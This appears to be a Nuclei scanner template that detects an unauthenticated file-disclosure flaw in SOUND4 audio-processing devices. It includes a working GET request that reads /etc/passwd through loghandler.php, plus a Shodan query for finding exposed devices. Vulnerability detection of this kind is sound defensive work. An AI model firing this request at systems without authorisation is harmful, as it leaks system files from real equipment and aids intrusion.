id: sound4-disclosure

info:
  name: SOUND4 FIRST - File Disclosure
  author: arafatansari
  severity: medium
  reference:
    - https://packetstormsecurity.com/files/170263/SOUND4-IMPACT-FIRST-PULSE-Eco-2.x-Unauthenticated-File-Disclosure.html
  description: |
    SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure
  metadata:
    shodan-query: http.html:"SOUND4"
    verified: true
  tags: command,injected,unauthenticated

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
